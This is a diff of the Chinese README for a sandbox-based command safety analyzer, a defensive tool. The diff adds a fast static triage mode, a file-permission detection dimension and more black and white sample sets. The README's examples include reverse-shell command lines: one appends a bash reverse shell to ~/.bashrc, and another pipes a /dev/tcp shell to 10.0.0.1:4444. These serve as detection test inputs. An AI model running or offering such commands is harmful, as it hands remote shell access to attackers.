@@ -1,6 +1,6 @@
 # Command Safety Analyzer with OpenSandbox — v4
 
-在 OpenSandbox 隔离沙箱中运行命令，通过 **23 维度深度行为分析** + **MITRE ATT&CK 映射 (40+ 技术)** + **加权评分 + 攻击链关联** 判断命令安全性。
+在 OpenSandbox 隔离沙箱中运行命令，通过 **24 维度深度行为分析** + **MITRE ATT&CK 映射 (40+ 技术)** + **加权评分 + 攻击链关联 + 命令去混淆 + 快速预判** 判断命令安全性。
 
 ## 快速开始
 
@@ -33,11 +33,11 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 ## 项目结构
 
 ```
-├── checker.sh          # 单命令深度检测器 (OpenSandbox 沙箱 + 23 维度分析)
+├── checker.sh          # 单命令深度检测器 (OpenSandbox 沙箱 + 24 维度分析)
 ├── run_all.sh          # 批量运行 + Git 自动提交 + 性能分析 + 重试
 ├── samples/
-│   ├── white.jsonl     # 白样本 30 条 (安全命令)
-│   └── black.jsonl     # 黑样本 30 条 (恶意命令)
+│   ├── white.jsonl     # 白样本 35 条 (安全命令, 含边界案例)
+│   └── black.jsonl     # 黑样本 35 条 (恶意命令, 含伪装/混淆)
 ├── reports/
 │   ├── white/          # 白样本报告 (JSON + log)
 │   ├── black/          # 黑样本报告
@@ -54,7 +54,24 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 {"id": "b01", "label": "malicious", "desc": "reverse shell", "command": "echo 'bash -i >& ...' >> ~/.bashrc"}
 ```
 
-## 23 维度检测体系
+## 快速预判模式
+
+无需启动沙箱，纯静态秒级评估（适合 API 集成）:
+
+```bash
+# 快速预判 (不启动 Docker, 毫秒级响应)
+FAST_TRIAGE=1 COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' | bash" ./checker.sh
+
+# 输出 JSON: {"level": "BLOCK", "static_score": 85, "patterns_matched": 3, ...}
+```
+
+| 预判级别 | 含义 | 建议动作 |
+|----------|------|----------|
+| `BLOCK` | 高置信恶意 | 直接阻断 |
+| `REVIEW` | 需深度分析 | 启动沙箱检测 |
+| `PASS` | 高置信安全 | 直接放行 |
+
+## 24 维度检测体系
 
 | #  | 维度 | 方法 | MITRE 覆盖 |
 |----|------|------|------------|
@@ -81,6 +98,7 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 | 21 | 隐藏进程 | /proc 遍历 vs ps 交叉对比 | T1564.001 |
 | 22 | 信号处理 | trap 劫持检测 (EXIT/INT/TERM/HUP) | T1059.004 |
 | 23 | 攻击链关联 | 多维度交叉研判 (5 种攻击链模式) | 多个 |
+| 24 | 文件权限 | 敏感文件权限变更 + world-writable 检测 | T1222.002 |
 
 ## 攻击链关联分析
 
@@ -229,6 +247,14 @@ echo '{"id": "b31", "label": "malicious", "desc": "my test", "command": "..."}' 
 ```
 
 ## v3 -> v4 变更日志
+
+### v4.2
+- 新增: 快速预判模式 (FAST_TRIAGE=1, 不启动沙箱, 毫秒级 API 响应)
+- 新增: 人类可读文本摘要 (.txt 报告, text_summary 字段)
+- 新增: D24 文件权限变更追踪 (敏感文件权限 + world-writable 检测)
+- 新增: 快速预判 vs 深度分析对比 (识别纯动态攻击)
+- 新增: 10 个边界案例样本 (35+35, 含伪装恶意/安全误报场景)
+- 报告格式: v4.1 -> v4.2 (新增 fast_triage/text_summary)
 
 ### v4.1
 - 新增: 命令去混淆引擎 (base64/hex/eval/$'' 四层解码)
